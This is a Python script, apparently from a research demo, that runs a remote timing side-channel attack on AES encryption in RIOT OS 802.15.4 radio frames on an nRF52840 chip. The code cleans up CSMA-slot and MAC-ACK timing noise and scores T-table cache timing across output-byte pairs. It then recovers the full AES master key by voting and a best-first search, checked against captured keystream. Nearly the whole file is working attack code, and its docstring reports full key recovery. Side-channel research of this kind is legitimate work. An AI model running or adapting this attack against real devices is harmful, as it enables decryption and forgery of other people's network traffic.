"""The attack: condition the attacker's clock, vote, search, verify.

    python -m demos.riot_802154.host.recover <capture>_*.jsonl \
        --blocks 1 2 3 4 --line-off 2 [--truth <hex>]

Two halves, and the first is the one that decides whether this works.

CONDITIONING. The attacker's interval is the reply END minus the request END
on its own 16 MHz timer. Two terms in it are nuisance, both visible to the
attacker and neither key-dependent:

  * the CSMA slot. Backoff is drawn in whole `aUnitBackoffPeriod` units, so the
    interval is quantised. Subtracting `320 us x round((reply - min) / 320)`
    removes the NOMINAL period and leaves each slot a residual offset of its
    own; median-centring within (capture file, slot) removes that. On the
    measured capture this term alone takes the vote from 3/16 to 13/16.
  * the MAC ACK. RIOT's nRF52840 submac builds and transmits the ACK in
    software BEFORE GNRC decrypts the frame, so it carries no cipher time
    (r = 0.006 against the victim's own encryption clock) and does carry the
    medium-access delay. Regressing it out costs no signal and finishes the
    job: 13/16 to 16/16.

    FIT THAT COEFFICIENT PER FRAME SHAPE. A longer reply has both a longer
    reply time and a longer ACK interval, so one coefficient fitted across
    mixed payload sizes estimates the between-size relation instead of the
    within-size common mode: on a 48/64-byte mix the global fit took the
    timing's SD from 1.20 us to 7.09 us and returned 0/16. Fitting per capture
    file is the other error -- ~200 frames per two-parameter fit, which cost a
    single-size rung 16/16 by vote down to 13/16 plus a 1,992-key walk.

RECOVERY. All 120 output-byte pairs are scored and ranked by their own blind
z-margin; nothing preselects a pair set. On the measured capture the fifteen
that rose above the floor were exactly the fifteen consecutive pairs of the
compiler's emitted last-round load order -- which the attack therefore reads
off the air without the binary. Then a margin-weighted vote, and where that
leaves a byte or two the best-first walk over all sixteen positions at once,
each candidate checked by encrypting a counter block the attacker heard and
comparing with the keystream. Verification needs no further traffic, so the
candidate count is offline work.
"""

import argparse
import json
import sys
from pathlib import Path

import numpy as np

from flashattack import aesref, bruteforce, engine, search

from . import frames as frames_mod

LINE_SHIFT = 2          # Te0's 4-byte entries in the nRF52840's 16-byte row


def centre_groups(t, *keys):
    """Median-centre within each distinct combination of the group ids."""
    t = np.asarray(t, float).copy()
    code = np.zeros(len(t), np.int64)
    for k in keys:
        k = np.asarray(k, np.int64)
        code = code * (int(k.max()) + 1) + k
    order = np.argsort(code, kind="stable")
    cs = code[order]
    bounds = np.flatnonzero(np.r_[True, cs[1:] != cs[:-1], True])
    for lo, hi in zip(bounds[:-1], bounds[1:]):
        idx = order[lo:hi]
        t[idx] -= np.median(t[idx])
    return t


def project_out(t, regressor, groups):
    """Residual of `t` on `regressor` plus an intercept, fitted per group."""
    t = np.asarray(t, float)
    r = np.asarray(regressor, float)
    out = t.copy()
    groups = np.asarray(groups)
    for g in np.unique(groups):
        m = groups == g
        X = np.column_stack([np.ones(int(m.sum())), r[m]])
        beta, *_ = np.linalg.lstsq(X, t[m], rcond=None)
        out[m] = t[m] - X @ beta
    return out


def condition(rows, mode="full"):
    """The per-row timing the score surfaces see, from radio data only.

    `full` is both terms. `slot` and `ack` are the ablation arms, and `raw` is
    median-centring per capture file, which is what a first attempt does and
    what leaves this capture looking like a null.
    """
    raw = np.array([r["slot_adjusted_us"] for r in rows], float)
    src = np.unique([r["source"] for r in rows], return_inverse=True)[1]
    slot = np.array([r["csma_slot"] for r in rows], np.int64)
    ack = np.array([r["ack_us"] for r in rows], float)
    size = np.array([r["payload_len"] for r in rows], np.int64)
    if mode == "raw":
        return centre_groups(raw, src)
    if mode == "slot":
        return centre_groups(raw, src, slot)
    if mode == "ack":
        return centre_groups(project_out(raw, ack, size), src)
    if mode == "full":
        return centre_groups(project_out(raw, ack, size), src, slot)
    raise ValueError(mode)


def stack(rows, blocks, timing):
    """Concatenate the CTR blocks of each reply, repeating its timing.

    One reply contributes as many observations as it has complete blocks the
    attacker can predict. An observation does not transfer between arms:
    scoring one block of a four-block reply leaves the other three blocks' last
    rounds as noise in the very same measurement.
    """
    out = np.concatenate([np.stack([np.frombuffer(r["aes_output"][b], np.uint8)
                                    for r in rows]) for b in blocks])
    return out.astype(np.int64), np.tile(np.asarray(timing, float), len(blocks))


def verify_batch(rk_last, pairs):
    """Which of many final round keys reproduce every observed block."""
    rk = np.asarray(rk_last, np.uint8)
    master = bruteforce.invert_key_schedules(rk)
    rks = bruteforce.expand_keys(master)
    keep = np.ones(len(rk), bool)
    for pt, ct in pairs:
        got = bruteforce.decrypt_block(rks, np.frombuffer(ct, np.uint8))
        keep &= (got == np.frombuffer(pt, np.uint8)[None, :]).all(axis=1)
        if not keep.any():
            break
    return master, keep


def finish_search(candidates, pairs, depth, budget, batch=1 << 14):
    """Walk the candidate keys in ascending vote cost until one verifies.

    `engine.recover` finishes a near-miss by brute-forcing its two
    LOWEST-CONFIDENCE positions over 0..255, which fails whenever a wrong byte
    is not one of those two -- on the campaign's own amplified capture the vote
    missed positions 10 and 15 while the weakest two were 5 and 15, so that
    capture read as a 14/16 failure. A best-first walk over all sixteen
    positions has no such blind spot. Returns (candidates tried, master).
    """
    lists = []
    for pos, ranked in enumerate(candidates):
        top = ranked[0][1]
        lists.append([(float(top - w), (pos, int(v)))
                      for v, w in ranked[:depth]])
    tried, pending = 0, []

    def flush():
        master, keep = verify_batch(
            np.frombuffer(b"".join(pending), np.uint8).reshape(-1, 16), pairs)
        if keep.any():
            hit = int(np.flatnonzero(keep)[0])
            return tried + hit + 1, bytes(master[hit])
        return None

    for payload in search.best_first(lists, budget):
        rk = bytearray(16)
        for i, v in payload:
            rk[i] = v
        pending.append(bytes(rk))
        if len(pending) >= batch:
            got = flush()
            if got:
                return got
            tried += len(pending)
            pending = []
    if pending:
        got = flush()
        if got:
            return got
        tried += len(pending)
    return tried, None


def recover(rows, blocks, line_off, *, mode="full", depth=8, budget=1 << 20,
            pairs="all", holdout=None, truth=None, vote_only=False):
    """(master key or None, notes). Never reads `truth` to decide anything."""
    timing = condition(rows, mode)
    output, y = stack(rows, blocks, timing)
    check = [(frames_mod.counter_block(r["src_eui_le"], r["frame_counter"],
                                       blocks[0], r["security_level"]),
              r["aes_output"][blocks[0]])
             for r in (holdout or rows)[:2]]
    rk_truth = (bytes(aesref.key_expansion(truth)[-1]) if truth else None)
    res = engine.recover(output, y, direction="enc", keysize=128,
                         line_shift=LINE_SHIFT, line_off=line_off, pairs=pairs,
                         verify=None if vote_only else check[0],
                         cand_per_pos=max(8, depth), max_bruteforce=2,
                         truth=rk_truth)
    notes = ["%d observations from %d replies x %d blocks"
             % (len(y), len(rows), len(blocks))]
    if rk_truth is not None:
        notes.append("%d of 16 round-key bytes from the vote alone"
                     % res.truth_correct)
    master, tried = (res.master if res.verified else None), 0
    if master is None and not vote_only and depth > 1:
        tried, master = finish_search(res.candidates, check, depth, budget)
        if tried:
            notes.append("best-first walk tried %d candidate keys" % tried)
    if res.verified and res.bruteforced:
        notes.append("one byte over 256 at position %d" % res.bruteforced[0])
    return master, notes


def main():
    # @file reads the capture list from a manifest. A six-figure run is 480
    # files, and a command line that long is refused by the shell.
    ap = argparse.ArgumentParser(description=__doc__.split("\n")[0],
                                 fromfile_prefix_chars="@")
    ap.add_argument("files", type=Path, nargs="+")
    ap.add_argument("--blocks", type=int, nargs="+", default=[1, 2, 3, 4])
    ap.add_argument("--line-off", type=int, required=True,
                    help="from victim/verify_build.py. There is no default: a "
                         "trace count without it is under-specified")
    ap.add_argument("--mode", default="full",
                    choices=("full", "slot", "ack", "raw"))
    ap.add_argument("--frames", type=int, default=0,
                    help="use the first N clean replies; the rest are holdout")
    ap.add_argument("--depth", type=int, default=8)
    ap.add_argument("--truth", help="for reporting only; changes no decision")
    ap.add_argument("--report", type=Path)
    args = ap.parse_args()

    rows, rejected = frames_mod.extract(args.files, blocks=args.blocks)
    use = len(rows) if not args.frames else min(args.frames, len(rows))
    attack_rows, holdout = rows[:use], rows[use:]
    print("clean replies %d of %d probes; rejected %s"
          % (len(rows), sum(1 for p in args.files for _ in open(p)),
             dict(rejected)))
    truth = bytes.fromhex(args.truth) if args.truth else None
    master, notes = recover(attack_rows, args.blocks, args.line_off,
                            mode=args.mode, depth=args.depth,
                            holdout=holdout or None, truth=truth)
    for n in notes:
        print("  %s" % n)
    print("  recovered   %s" % (master.hex() if master else "nothing"))

    matched = total = 0
    if master and holdout:
        pts = np.stack([np.frombuffer(
            frames_mod.counter_block(r["src_eui_le"], r["frame_counter"],
                                     args.blocks[0], r["security_level"]),
            np.uint8) for r in holdout])
        got = aesref.encrypt_blocks(master, pts)
        total = len(holdout)
        matched = int(sum(bytes(g) == r["aes_output"][args.blocks[0]]
                          for g, r in zip(got, holdout)))
        print("  holdout     %d/%d unseen replies reproduce" % (matched, total))
    if truth:
        print("  truth       %s  %s" % (truth.hex(),
                                        "MATCH" if master == truth else "no"))
    if args.report:
        args.report.write_text(json.dumps(dict(
            files=[p.name for p in args.files], clean=len(rows),
            attacked=use, blocks=args.blocks, line_off=args.line_off,
            mode=args.mode, notes=notes,
            recovered=master.hex() if master else None,
            holdout_matched=matched, holdout_total=total,
            truth_matches=(master == truth) if truth else None), indent=2) + "\n",
            newline="\n")
    return 0 if master else 1


if __name__ == "__main__":
    sys.exit(main())
